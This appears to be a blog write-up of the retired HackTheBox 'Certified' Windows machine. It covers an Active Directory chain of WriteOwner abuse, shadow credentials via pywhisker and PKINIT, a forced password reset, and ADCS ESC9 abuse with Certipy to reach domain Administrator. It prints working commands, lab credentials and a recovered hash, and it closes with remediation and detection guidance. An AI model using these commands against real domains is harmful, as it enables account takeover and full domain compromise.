---
# ─── Post settings ──────────────────────────────────────────────
title: "HackTheBox: Certified - Medium Windows"
date: 2025-10-08 01:30:00 -0400
categories: [HackTheBox, Windows]        # max 2 levels: [Main, Sub]
tags: [windows, active directory, adcs, privesc]          # lowercase, as many as you like
description: >-
  Certified is a medium Windows machine built entirely around Active Directory permission abuse and ADCS. Starting from low-privileged credentials, we take ownership of a group, run a shadow credential attack to steal a service account, force-change another account's password, and finish by exploiting ADCS ESC9 to authenticate as the domain Administrator.
image:
  path: banner.png
pin: false
toc: true
math: false
mermaid: false
---

## Overview

| | |
|---|---|
| **Platform** | HackTheBox |
| **Difficulty** | Medium |
| **OS** | Windows |
| **Key techniques** | WriteOwner, Shadow Credentials, Targeted Kerberoast, ADCS ESC9 |

Certified is an assumed-breach box, no exploitation of a service, just a chain of misconfigured AD object permissions ending in a certificate services abuse. It's a great ESC9 practice box.

> This post covers a retired box. Spoilers ahead.
{: .prompt-info }

## Recon

As is common in these Windows boxes, we start with credentials for a low-privileged account:

```text
judith.mader/judith09
```

### Port scan

```bash
nmap -A -Pn -p- 10.129.231.186 -oA nmap_output/certified.htb
```

```text
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb)
445/tcp   open  microsoft-ds?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
```

`DC01.certified.htb`, a standard domain controller. SMB has nothing interesting with our initial creds, so the whole box lives in the AD. I mainly used BloodHound here, our starting account turns out to sit at the top of a chain of ACL edges.

## Initial Access

### judith.mader → MANAGEMENT group (WriteOwner)


```bash
# become the owner of the group
impacket-owneredit -action write -new-owner 'judith.mader' -target 'MANAGEMENT' \
  CERTIFIED/judith.mader:judith09

# grant judith FullControl over it
dacledit.py -action write -rights FullControl -inheritance -principal 'judith.mader' \
  -target 'management' "certified.htb"/"judith.mader":'judith09'

# add ourselves to the group we now own
net rpc group addmem "management" "judith.mader" \
  -U "certified.htb"/"judith.mader"%'judith09' -S "dc01.certified.htb"
```

![Added to the MANAGEMENT group](management-group.png){: w="800" }

### MANAGEMENT → management_svc (Shadow Credentials)

Membership in `MANAGEMENT` gives us control over the `management_svc` account. First I tried a targeted Kerberoast, but the resulting hash wouldn't crack:

```bash
python3 targetedKerberoast.py -v -d 'certified.htb' -u 'judith.mader' -p 'judith09'
```

![Uncrackable kerberoast hash](kerberoast.png){: w="800" }

So I switched to a **shadow credential** attack instead. Since we can write to `management_svc`'s `msDS-KeyCredentialLink`, we add our own key credential with pywhisker, then use PKINIT to authenticate and recover the account's NT hash, no password cracking required:

```bash
python3 pywhisker.py -d "certified.htb" -u "judith.mader" -p "judith09" \
  --target "management_svc" --action "add"
python3 gettgtpkinit.py -cert-pfx <cert>.pfx -pfx-pass '<pass>' \
  certified.htb/management_svc user_TGT.ccache
```

![management_svc hash via PKINIT](shadow-cred.png){: w="800" }

```text
management_svc : a091c1832bcdd4677c28b5a6a1295584
```

> Shadow credentials are the go-to when you have write access to an account's `msDS-KeyCredentialLink` but its password won't crack. You attach a certificate you control and authenticate as them via PKINIT, cleaner and faster than roasting.
{: .prompt-tip }

## Privilege Escalation

### management_svc → ca_operator

`management_svc` has write access over `ca_operator`, so we force-change its password with PowerView from a WinRM session:

```powershell
$UserPassword = ConvertTo-SecureString "P@ssw0rd!2025" -AsPlainText -Force
Set-DomainUserPassword -Identity ca_operator -AccountPassword $UserPassword
```

With `ca_operator` controlled, a Certipy scan reveals why this account matters, it can enroll in a template vulnerable to **ESC9**:

```bash
certipy find -u ca_operator -p 'P@ssw0rd!2025' -dc-ip 10.129.231.186 -vulnerable -enabled -hide-admins
```

```text
Template Name : CertifiedAuthentication
  Enrollment Rights : CERTIFIED.HTB\operator ca
  [!] Vulnerabilities:
    ESC9 : Template has no security extension.
```

![ESC9 vulnerable template](esc9.png){: w="800" }

## Root / Flags

### ESC9 → Administrator

ESC9 abuses a template that has **no security extension** (`szOID_NTDS_CA_SECURITY_EXT`). Without it, the CA maps the issued certificate to whatever UPN is on the enrolling account, rather than binding it to the account's SID. So the attack is:

1. Change `ca_operator`'s UPN to `Administrator` (using `management_svc`, which controls it).
2. Request a certificate as `ca_operator` on the vulnerable template, it gets issued for Administrator.
3. Revert the UPN so authentication maps cleanly.
4. Authenticate with the certificate as Administrator.

```bash
# set ca_operator's UPN to Administrator
certipy account update -username management_svc@certified.htb -hashes <mgmt_hash> \
  -user ca_operator -upn Administrator

# request the cert as ca_operator
certipy req -ca 'certified-DC01-CA' -username ca_operator@certified.htb -hashes <ca_op_hash> \
  -template CertifiedAuthentication

# revert the UPN
certipy account update -username management_svc@certified.htb -hashes <mgmt_hash> \
  -user ca_operator -upn ca_operator@certified.htb

# authenticate as Administrator
certipy-ad auth -pfx administrator.pfx -domain certified.htb -dc-ip 10.129.61.130
```

![Administrator authentication via ESC9](root.png){: w="800" }

That returns the Administrator hash, and the box is rooted.

> This one was finicky, ESC9's UPN swap has to line up exactly between the request and the auth, and I had to restart services and retry a couple of times before the cert mapped correctly. When in doubt, reset everything and run the chain cleanly.
{: .prompt-warning }

## Lessons Learned

- **ACL chains do the heavy lifting.** WriteOwner → group control → shadow creds → ForceChangePassword walked a basic user down to an ADCS-enrollable account with no exploit in sight.
- **Shadow credentials beat uncrackable hashes.** When the Kerberoast didn't crack, write access to `msDS-KeyCredentialLink` still got me the account via PKINIT.
- **Templates without the SID security extension are dangerous.** ESC9 turns "control an account's UPN + cert enrollment" into authenticating as anyone in the domain.

## Remediation

How a defender would fix this:

- Audit object ACLs and remove WriteOwner / write access from unprivileged users over groups and accounts.
- Protect `msDS-KeyCredentialLink` writes, this is the shadow credential surface.
- Patch ADCS templates to enforce the SID security extension and set strong certificate mapping (`StrongCertificateBindingEnforcement`) so UPN-based mapping can't be abused.

How a defender would detect this:

- Directory changes (Event ID 5136) to group ownership, `msDS-KeyCredentialLink`, and `userPrincipalName`, especially a UPN set to a privileged name.
- Certificate enrollment events (4886/4887) where the subject/UPN doesn't match the requester.

## References

- [Certipy](https://github.com/ly4k/Certipy)
- [pywhisker (Shadow Credentials)](https://github.com/ShutdownRepo/pywhisker)
- [HackTricks — AD Certificates / Domain Escalation](https://angelica.gitbook.io/hacktricks/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation)
